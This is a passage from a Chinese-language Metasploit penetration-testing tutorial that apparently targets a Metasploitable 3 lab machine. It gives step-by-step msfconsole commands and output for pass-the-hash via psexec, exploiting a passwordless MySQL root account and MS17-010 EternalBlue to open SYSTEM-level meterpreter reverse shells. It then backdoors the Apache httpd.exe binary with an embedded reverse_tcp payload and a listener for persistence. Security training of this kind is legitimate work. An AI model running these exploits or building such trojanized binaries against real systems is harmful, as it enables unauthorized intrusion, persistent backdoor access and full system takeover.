
另一种选择是使用哈希攻击，即攻击者窃取用户的哈希值，而无需破解它，即可重复使用它来欺骗身份验证系统创建新的已认证会话：

```
msf exploit(psexec) > set SMBPASS
 aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
 SMBPASS =>
 aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
 msf exploit(psexec) > exploit

 [*] Started reverse TCP handler on 192.168.216.5:4444
 [*] 192.168.216.10:445 - Connecting to the server...
 ...
 meterpreter >
```

## 利用常见服务

谈到利用时，会想到一些服务，主要是因为它们在大多数目标上都很常见，而且经常被忽视。

### 准备工作

在本教程中，我们将利用在目标环境中会找到的最常见且被滥用的服务之一，即 MySQL。大多数情况下我们能够利用 MySQL 服务，是因为它们是为开发目的而安装的，忽略了一些最佳实践，例如设置 root 密码或使用强密码。

### 如何操作

为了利用 Metasploitable 3 目标机器上的 MySQL 服务，我们将使用 MySQL Enumeration Module 辅助模块来枚举目标，并使用 Oracle MySQL for the Microsoft Windows Payload Execution 漏洞利用模块来获取远程 shell：

```
msf > use auxiliary/admin/mysql/mysql_enum
 msf auxiliary(mysql_enum) > set RHOST 192.168.216.10
 RHOST => 192.168.216.10
 msf auxiliary(mysql_enum) > set USERNAME root
 USERNAME => root
 msf auxiliary(mysql_enum) > run
```

```
[*] 192.168.216.10:3306 - Running MySQL Enumerator...
[*] 192.168.216.10:3306 - Enumerating Parameters
...
msf auxiliary(mysql_enum) > use exploit/windows/mysql/mysql_payload
msf exploit(mysql_payload) > set RHOST 192.168.216.10
RHOST => 192.168.216.10
msf exploit(mysql_payload) > set PAYLOAD
windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(mysql_payload) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(mysql_payload) > exploit
```

```
[*] Started reverse TCP handler on 192.168.216.5:4444
[*] 192.168.216.10:3306 - Checking target architecture...
[*] 192.168.216.10:3306 - Checking for sys_exec()...
[*] 192.168.216.10:3306 - sys_exec() already available, using that (override with FORCE_UDF_UPLOAD).
...
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

由于目标没有 root 密码，因此可以使用 MySQL 服务上传 shell 并获得对系统的远程访问。因此，即使你认为没有人会配置一个没有密码的服务，也不要忘记测试基础内容。

## MS17-010 EternalBlue SMB 远程 Windows 内核池损坏

再次，利用在信息收集和扫描阶段收集到的情报，特别是 MS17-010 SMB RCE Detection 辅助模块的输出，我们可以转向下一个易受攻击的服务。

### 准备工作

不深入细节，MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 漏洞利用模块是 Equation Group ETERNALBLUE 漏洞利用的一部分，该漏洞利用是 Shadow Brokers 发布 FuzzBunch 工具包的一部分，通常被认为是由美国国家安全局（NSA）开发并作为 WannaCry 勒索软件攻击的一部分使用。它是 Srv!SrvOs2FeaToNt 中 memmove 操作的缓冲区溢出，允许我们执行任意有效载荷。此漏洞影响未安装针对 Microsoft Windows SMB Server SMBv1 Server 的安全更新 MS17-010 的 Windows 机器。

### 如何操作...

要启动漏洞利用，请使用 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 漏洞利用模块，设置目标 IP 地址，使用 meterpreter 反向 TCP 有效载荷，并指定监听地址：

```
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) > set RHOST 192.168.216.10
RHOST => 192.168.216.10
msf exploit(ms17_010_eternalblue) > set PAYLOAD
windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(ms17_010_eternalblue) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(ms17_010_eternalblue) > exploit
...

meterpreter > sysinfo
Computer : VAGRANT-2008R2
OS : Windows 2008 R2 (Build 7601, Service Pack 1).
...

meterpreter >
```

渗透测试与漏洞扫描器不同的一个结果是，当你向他们展示目标系统上正在运行的 shell 的屏幕截图时，没有人会说你发现的是误报。

## MS17-010 EternalRomance/EternalSynergy/EternalChampion

MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 漏洞利用模块可用于通过 EternalRomance、EternalSynergy 和 EternalChampion 利用 MS17-010 漏洞。此漏洞利用比 EternalBlue 漏洞利用更可靠，但需要命名管道。

### 如何操作...

要启动漏洞利用，请使用 MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 漏洞利用模块，设置目标 IP 地址，使用 meterpreter 反向 TCP 有效载荷，并指定监听地址：

![](img/6b6e557533100c0e47951d0e5e14c4ee_470_0.png)

## 安装后门

在目标系统上拥有一个 shell 很棒，但有时还不够。有了后门，我们就能确保持久性并在漏洞被修补后仍能访问系统。

### 准备工作

现在我们在目标系统中有了一个会话，我们将使用该会话来后门一个服务；在本教程中，我们将首先对 Apache 服务器进行后门：

![](img/6b6e557533100c0e47951d0e5e14c4ee_471_0.png)

接下来，我们将使用 Windows Registry Only Persistence 本地漏洞利用模块创建一个在启动时执行的后门。

最后，我们将使用 Windows Management Instrumentation（WMI）创建一个持久的无文件后门。WMI Event Subscription Persistence 漏洞利用模块创建永久的 WMI 事件订阅以实现无文件持久性。

### 如何操作...

- 1. 由于我们不能在二进制文件运行时对其进行后门，因此首先需要做的是杀死 Apache 进程（httpd.exe），使用 kill 命令后跟进程的 PID：

```
meterpreter > kill 3820
Killing: 3820
meterpreter >
```

- 2. 然后，我们在 meterpreter 中使用 download 命令下载我们想要后门的服务二进制文件：

```
meterpreter > download
C:\\wamp\\bin\\apache\\apache2.2.21\\bin\\httpd.exe
[*] Downloading: C:\wamp\bin\apache\apache2.2.21\bin\httpd.exe
-> httpd.exe
...

msf exploit(ms17_010_eternalblue) >
```

为了后门该服务，我们将使用 msfconsole，并使用反向 TCP。

- 3. 将监听地址设置为我们的 Kali Linux 机器 IP 地址，并使用 generate 命令对二进制文件进行后门，使用 -a 选项指定架构、-p 指定平台、-x 指定要使用的可执行模板、-k 保持模板可执行文件功能、-t 指定输出格式、-f 指定输出文件名：

```
msf exploit(ms17_010_eternalblue) > use payload/windows/x64/meterpreter/reverse_tcp
msf payload(reverse_tcp) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf payload(reverse_tcp) > generate -a x64 -p Windows -x /root/httpd.exe -k -t exe -f httpd-backdoored.exe
[*] Writing 29184 bytes to httpd-backdoored.exe...
msf payload(reverse_tcp) >
```

- 4. 现在后门已准备就绪，我们需要为反向连接启动一个监听器；为此我们将使用 Generic Payload Handler：

```
msf payload(reverse_tcp) > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD
windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(handler) > exploit -j
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.216.5:4444
msf exploit(handler) >
```

exploit -j 命令将在作业的上下文中运行它，使我们能够返回到我们的会话并继续攻击。
